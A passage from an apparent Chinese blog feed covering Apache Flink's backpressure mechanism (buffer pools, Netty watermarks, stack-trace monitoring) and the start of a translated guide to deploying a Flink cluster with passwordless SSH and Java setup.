&lt;li&gt;本地传输：如果 Task 1 和 Task 2 运行在同一个 worker 节点（TaskManager），该 buffer 可以直接交给下一个 Task。一旦 Task 2 消费了该 buffer，则该 buffer 会被缓冲池1回收。如果 Task 2 的速度比 1 慢，那么 buffer 回收的速度就会赶不上 Task 1 取 buffer 的速度，导致缓冲池1无可用的 buffer，Task 1 等待在可用的 buffer 上。最终形成 Task 1 的降速。&lt;/li&gt;
&lt;li&gt;远程传输：如果 Task 1 和 Task 2 运行在不同的 worker 节点上，那么 buffer 会在发送到网络（TCP Channel）后被回收。在接收端，会从 LocalBufferPool 中申请 buffer，然后拷贝网络中的数据到 buffer 中。如果没有可用的 buffer，会停止从 TCP 连接中读取数据。在输出端，通过 Netty 的水位值机制来保证不往网络中写入太多数据（后面会说）。如果网络中的数据（Netty输出缓冲中的字节数）超过了高水位值，我们会等到其降到低水位值以下才继续写入数据。这保证了网络中不会有太多的数据。如果接收端停止消费网络中的数据（由于接收端缓冲池没有可用 buffer），网络中的缓冲数据就会堆积，那么发送端也会暂停发送。另外，这会使得发送端的缓冲池得不到回收，writer 阻塞在向 LocalBufferPool  请求 buffer，阻塞了 writer 往 ResultSubPartition 写数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这种固定大小缓冲池就像阻塞队列一样，保证了 Flink 有一套健壮的反压机制，使得 Task 生产数据的速度不会快于消费的速度。我们上面描述的这个方案可以从两个 Task 之间的数据传输自然地扩展到更复杂的 pipeline 中，保证反压机制可以扩散到整个 pipeline。&lt;/p&gt;
&lt;h3 id=&quot;Netty-水位值机制&quot;&gt;&lt;a href=&quot;#Netty-水位值机制&quot; class=&quot;headerlink&quot; title=&quot;Netty 水位值机制&quot;&gt;&lt;/a&gt;Netty 水位值机制&lt;/h3&gt;&lt;p&gt;下方的代码是初始化 NettyServer 时配置的水位值参数。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 默认高水位值为2个buffer大小, 当接收端消费速度跟不上，发送端会立即感知到&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bootstrap.childOption(ChannelOption.WRITE_BUFFER_LOW_WATER_MARK, config.getMemorySegmentSize() + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bootstrap.childOption(ChannelOption.WRITE_BUFFER_HIGH_WATER_MARK, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; * config.getMemorySegmentSize());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当输出缓冲中的字节数超过了高水位值, 则 Channel.isWritable() 会返回false。当输出缓存中的字节数又掉到了低水位值以下, 则 Channel.isWritable() 会重新返回true。Flink 中发送数据的核心代码在 &lt;code&gt;PartitionRequestQueue&lt;/code&gt; 中，该类是 server channel pipeline 的最后一层。发送数据关键代码如下所示。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;writeAndFlushNextMessageIfPossible&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; Channel channel)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; IOException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (fatalError) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Buffer buffer = &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// channel.isWritable() 配合 WRITE_BUFFER_LOW_WATER_MARK &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 和 WRITE_BUFFER_HIGH_WATER_MARK 实现发送端的流量控制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (channel.isWritable()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 注意: 一个while循环也就最多只发送一个BufferResponse, 连续发送BufferResponse是通过writeListener回调实现的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (currentPartitionQueue == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; (currentPartitionQueue = queue.poll()) == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        buffer = currentPartitionQueue.getNextBuffer();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buffer == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;comment&quot;&gt;// 跳过这部分代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;comment&quot;&gt;// 构造一个response返回给客户端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          BufferResponse resp = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; BufferResponse(buffer, currentPartitionQueue.getSequenceNumber(), currentPartitionQueue.getReceiverId());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!buffer.isBuffer() &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              EventSerializer.fromBuffer(buffer, getClass().getClassLoader()).getClass() == EndOfPartitionEvent.class) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;// 跳过这部分代码。batch 模式中 subpartition 的数据准备就绪，通知下游消费者。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;comment&quot;&gt;// 将该response发到netty channel, 当写成功后, &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;comment&quot;&gt;// 通过注册的writeListener又会回调进来, 从而不断地消费 queue 中的请求&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          channel.writeAndFlush(resp).addListener(writeListener);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (Throwable t) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buffer != &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      buffer.recycle();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; IOException(t.getMessage(), t);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 当水位值降下来后（channel 再次可写），会重新触发发送函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;channelWritabilityChanged&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(ChannelHandlerContext ctx)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  writeAndFlushNextMessageIfPossible(ctx.channel());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;核心发送方法中如果channel不可写，则会跳过发送。当channel再次可写后，Netty 会调用该Handle的 &lt;code&gt;channelWritabilityChanged&lt;/code&gt; 方法，从而重新触发发送函数。&lt;/p&gt;
&lt;h3 id=&quot;反压实验&quot;&gt;&lt;a href=&quot;#反压实验&quot; class=&quot;headerlink&quot; title=&quot;反压实验&quot;&gt;&lt;/a&gt;反压实验&lt;/h3&gt;&lt;p&gt;另外，&lt;a href=&quot;http://data-artisans.com/how-flink-handles-backpressure/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官方博客&lt;/a&gt;中为了展示反压的效果，给出了一个简单的实验。下面这张图显示了：随着时间的改变，生产者（黄色线）和消费者（绿色线）每5秒的平均吞吐与最大吞吐（在单一JVM中每秒达到8百万条记录）的百分比。我们通过衡量task每5秒钟处理的记录数来衡量平均吞吐。该实验运行在单 JVM 中，不过使用了完整的 Flink 功能栈。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1geTaHVXXXXcXXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;首先，我们运行生产task到它最大生产速度的60%（我们通过Thread.sleep()来模拟降速）。消费者以同样的速度处理数据。然后，我们将消费task的速度降至其最高速度的30%。你就会看到背压问题产生了，正如我们所见，生产者的速度也自然降至其最高速度的30%。接着，停止消费task的人为降速，之后生产者和消费者task都达到了其最大的吞吐。接下来，我们再次将消费者的速度降至30%，pipeline给出了立即响应：生产者的速度也被自动降至30%。最后，我们再次停止限速，两个task也再次恢复100%的速度。总而言之，我们可以看到：生产者和消费者在 pipeline 中的处理都在跟随彼此的吞吐而进行适当的调整，这就是我们希望看到的反压的效果。&lt;/p&gt;
&lt;h2 id=&quot;反压监控&quot;&gt;&lt;a href=&quot;#反压监控&quot; class=&quot;headerlink&quot; title=&quot;反压监控&quot;&gt;&lt;/a&gt;反压监控&lt;/h2&gt;&lt;p&gt;在 Storm/JStorm 中，只要监控到队列满了，就可以记录下拓扑进入反压了。但是 Flink 的反压太过于天然了，导致我们无法简单地通过监控队列来监控反压状态。Flink 在这里使用了一个 trick 来实现对反压的监控。如果一个 Task 因为反压而降速了，那么它会卡在向 &lt;code&gt;LocalBufferPool&lt;/code&gt; 申请内存块上。那么这时候，该 Task 的 stack trace 就会长下面这样：&lt;/p&gt;
&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;java&lt;span class=&quot;selector-class&quot;&gt;.lang&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.Object&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.wait&lt;/span&gt;(Native Method)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;o&lt;span class=&quot;selector-class&quot;&gt;.a&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.f&lt;/span&gt;.[...]&lt;span class=&quot;selector-class&quot;&gt;.LocalBufferPool&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.requestBuffer&lt;/span&gt;(LocalBufferPool&lt;span class=&quot;selector-class&quot;&gt;.java&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;163&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;o&lt;span class=&quot;selector-class&quot;&gt;.a&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.f&lt;/span&gt;.[...]&lt;span class=&quot;selector-class&quot;&gt;.LocalBufferPool&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.requestBufferBlocking&lt;/span&gt;(LocalBufferPool&lt;span class=&quot;selector-class&quot;&gt;.java&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;) &amp;lt;--- BLOCKING request&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[...]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么事情就简单了。通过不断地采样每个 task 的 stack trace 就可以实现反压监控。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1T3cJJpXXXXXLXpXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Flink 的实现中，只有当 Web 页面切换到某个 Job 的 Backpressure 页面，才会对这个 Job 触发反压检测，因为反压检测还是挺昂贵的。JobManager 会通过 Akka 给每个 TaskManager 发送&lt;code&gt;TriggerStackTraceSample&lt;/code&gt;消息。默认情况下，TaskManager 会触发100次 stack trace 采样，每次间隔 50ms（也就是说一次反压检测至少要等待5秒钟）。并将这 100 次采样的结果返回给 JobManager，由 JobManager 来计算反压比率（反压出现的次数/采样的次数），最终展现在 UI 上。UI 刷新的默认周期是一分钟，目的是不对 TaskManager 造成太大的负担。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;Flink 不需要一种特殊的机制来处理反压，因为 Flink 中的数据传输相当于已经提供了应对反压的机制。因此，Flink 所能获得的最大吞吐量由其 pipeline 中最慢的组件决定。相对于 Storm/JStorm 的实现，Flink 的实现更为简洁优雅，源码中也看不见与反压相关的代码，无需 Zookeeper/TopologyMaster 的参与也降低了系统的负载，也利于对反压更迅速的响应。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      流处理系统需要能优雅地处理反压（backpressure）问题。反压通常产生于这样的场景：短时负载高峰导致系统接收数据的速率远高于它处理数据的速率。许多日常问题都会导致反压，例如，垃圾回收停顿可能会导致流入的数据快速堆积，或者遇到大促或秒杀活动导致流量陡增。反压如果不能得到正确的处理，可能会导致资源耗尽甚至系统崩溃。那么 Flink 是怎么处理反压的呢？
    
    </summary>
    
      <category term="Flink" scheme="http://wuchong.me/categories/Flink/"/>
    
    
      <category term="Flink原理与实现" scheme="http://wuchong.me/tags/Flink%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    
      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
    
      <category term="反压" scheme="http://wuchong.me/tags/%E5%8F%8D%E5%8E%8B/"/>
    
  </entry>
  
  <entry>
    <title>Flink官方文档翻译：安装部署（集群模式）</title>
    <link href="http://wuchong.me/blog/2016/02/26/flink-docs-setup-cluster/"/>
    <id>http://wuchong.me/blog/2016/02/26/flink-docs-setup-cluster/</id>
    <published>2016-02-26T08:03:35.000Z</published>
    <updated>2016-03-01T11:27:51.000Z</updated>
    
    <content type="html">&lt;p&gt;本文主要介绍如何将Flink以分布式模式运行在集群上（可能是异构的）。&lt;/p&gt;
&lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;p&gt;Flink 运行在所有类 UNIX 环境上，例如 Linux、Mac OS X 和 Cygwin（对于Windows），而且要求集群由&lt;strong&gt;一个master节点&lt;/strong&gt;和&lt;strong&gt;一个或多个worker节点&lt;/strong&gt;组成。在安装系统之前，确保每台机器上都已经安装了下面的软件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Java 1.7.x&lt;/strong&gt;或更高版本&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ssh&lt;/strong&gt;（Flink的脚本会用到sshd来管理远程组件）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你的集群还没有完全装好这些软件，你需要安装/升级它们。例如，在 Ubuntu Linux 上， 你可以执行下面的命令安装 ssh 和 Java ：&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; ssh &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-&lt;span class=&quot;keyword&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; openjdk&lt;span class=&quot;number&quot;&gt;-7&lt;/span&gt;-jre&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;SSH免密码登录&quot;&gt;&lt;a href=&quot;#SSH免密码登录&quot; class=&quot;headerlink&quot; title=&quot;SSH免密码登录&quot;&gt;&lt;/a&gt;SSH免密码登录&lt;/h3&gt;&lt;p&gt;&lt;em&gt;译注：安装过Hadoop、Spark集群的用户应该对这段很熟悉，如果已经了解，可跳过。*&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;为了能够启动/停止远程主机上的进程，master节点需要能免密登录所有worker节点。最方便的方式就是使用ssh的公钥验证了。要安装公钥验证，首先以最终会运行Flink的用户登录master节点。&lt;strong&gt;所有的worker节点上也必须要有同样的用户（例如：使用相同用户名的用户）&lt;/strong&gt;。本文会以 flink 用户为例。非常不建议使用 root 账户，这会有很多的安全问题。&lt;/p&gt;
&lt;p&gt;当你用需要的用户登录了master节点，你就可以生成一对新的公钥/私钥。下面这段命令会在 ~/.ssh 目录下生成一对新的公钥/私钥。&lt;/p&gt;
&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssh-keygen -&lt;span class=&quot;selector-tag&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2048&lt;/span&gt; -P &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; -f ~/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来，将公钥添加到用于认证的&lt;code&gt;authorized_keys&lt;/code&gt;文件中：&lt;/p&gt;
&lt;figure class=&quot;highlight ruby&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cat ~&lt;span class=&quot;regexp&quot;&gt;/.ssh/id&lt;/span&gt;_rsa.pub &lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt; &lt;/span&gt;~&lt;span class=&quot;regexp&quot;&gt;/.ssh/authorized&lt;/span&gt;_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后，将&lt;code&gt;authorized_keys&lt;/code&gt;文件分发给集群中所有的worker节点，你可以重复地执行下面这段命令：&lt;/p&gt;
&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scp ~&lt;span class=&quot;regexp&quot;&gt;/.ssh/authorized&lt;/span&gt;_keys &amp;lt;worker&amp;gt;&lt;span class=&quot;symbol&quot;&gt;:~/&lt;/span&gt;.ssh/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将上面的&lt;code&gt;&amp;lt;worker&amp;gt;&lt;/code&gt;替代成相应worker节点的IP/Hostname。完成了上述拷贝的工作，你应该就可以从master上免密登录其他机器了。&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssh &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;worker&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;配置JAVA-HOME&quot;&gt;&lt;a href=&quot;#配置JAVA-HOME&quot; class=&quot;headerlink&quot; title=&quot;配置JAVA_HOME&quot;&gt;&lt;/a&gt;配置JAVA_HOME&lt;/h3&gt;&lt;p&gt;Flink 需要master和worker节点都配置了&lt;code&gt;JAVA_HOME&lt;/code&gt;环境变量。有两种方式可以配置。&lt;/p&gt;
&lt;p&gt;一种是，你可以在&lt;code&gt;conf/flink-conf.yaml&lt;/code&gt;中设置&lt;code&gt;env.java.home&lt;/code&gt;配置项为Java的安装路径。&lt;/p&gt;
&lt;p&gt;另一种是，&lt;code&gt;sudo vi /etc/profile&lt;/code&gt;，在其中添加&lt;code&gt;JAVA_HOME&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&quot;highlight autohotkey&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;export JAV&lt;span class=&quot;built_in&quot;&gt;A_HOME&lt;/span&gt;=/path/to/jav&lt;span class=&quot;built_in&quot;&gt;a_home&lt;/span&gt;/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后使环境变量生效，并验证 Java 是否安装成功&lt;/p&gt;
&lt;figure class=&quot;highlight armasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ source /etc/profile   #生效环境变量&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ java -version         #如果打印出版本信息，则说明安装成功&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;java&lt;/span&gt; version &lt;span class=&quot;string&quot;&gt;&quot;1.7.0_75&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;Java&lt;/span&gt;(TM) SE Runtime Environment (&lt;span class=&quot;keyword&quot;&gt;build &lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;_75-&lt;span class=&quot;keyword&quot;&gt;b13)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;symbol&quot;&gt;Java&lt;/span&gt; HotSpot(TM) &lt;span class=&quot;number&quot;&gt;64&lt;/span&gt;-&lt;span class=&quot;keyword&quot;&gt;Bit &lt;/span&gt;Server VM (&lt;span class=&quot;keyword&quot;&gt;build &lt;/span&gt;&lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;75&lt;/span&gt;-&lt;span class=&quot;keyword&quot;&gt;b04, &lt;/span&gt;mixed mode)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;安装-Flink&quot;&gt;&lt;a href=&quot;#安装-Flink&quot; class=&quot;headerlink&quot; title=&quot;安装 Flink&quot;&gt;&lt;/a&gt;安装 Flink&lt;/h2&gt;&lt;p&gt;进入&lt;a href=&quot;http://flink.apache.org/downloads.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;下载页面&lt;/a&gt;。请选择一个与你的Hadoop版本相匹配的Flink包。如果你不打算使用Hadoop，选择任何版本都可以。&lt;/p&gt;
&lt;p&gt;在下载了最新的发布包后，拷贝到master节点上，并解压：&lt;/p&gt;
&lt;figure class=&quot;highlight gherkin&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tar xzf flink-&lt;span class=&quot;keyword&quot;&gt;*&lt;/span&gt;.tgz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd flink-&lt;span class=&quot;keyword&quot;&gt;*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;配置-Flink&quot;&gt;&lt;a href=&quot;#配置-Flink&quot; class=&quot;headerlink&quot; title=&quot;配置 Flink&quot;&gt;&lt;/a&gt;配置 Flink&lt;/h2&gt;&lt;p&gt;在解压完之后，你需要编辑&lt;code&gt;conf/flink-conf.yaml&lt;/code&gt;配置Flink。&lt;/p&gt;
